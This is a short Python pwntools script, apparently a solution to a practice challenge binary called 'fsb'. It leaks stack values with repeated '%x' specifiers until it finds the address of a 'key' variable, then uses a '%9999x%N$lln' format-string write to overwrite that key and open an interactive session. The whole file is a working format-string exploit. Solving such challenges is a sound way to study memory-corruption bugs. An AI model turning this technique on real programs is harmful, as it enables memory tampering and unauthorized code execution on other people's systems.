from pwn import *

elf = context.binary = ELF("./fsb")

key_addr = 0x804a060
key_idx = 0
p: tubes.tube.tube

# Bruteforce alloca to find a suitable position for "key"
while True:
    p = process("./fsb")
    p.recvline()
    p.send(b"%x " * 33 + b"\n")
    data = [int(v,16) for v in p.recvline().split()]
    if key_addr in data:
        key_idx = data.index(key_addr)  + 1
        break
    p.close()

log.success("key in stack (idx): " + str(key_idx))
p.recvline()

# Write the value of "key"
p.send(f"%9999x%{key_idx}$lln\x00".encode())
p.send(b"\x00"); p.send(b"\x00")

sleep(3.5)
p.send(b"9999")

p.interactive()

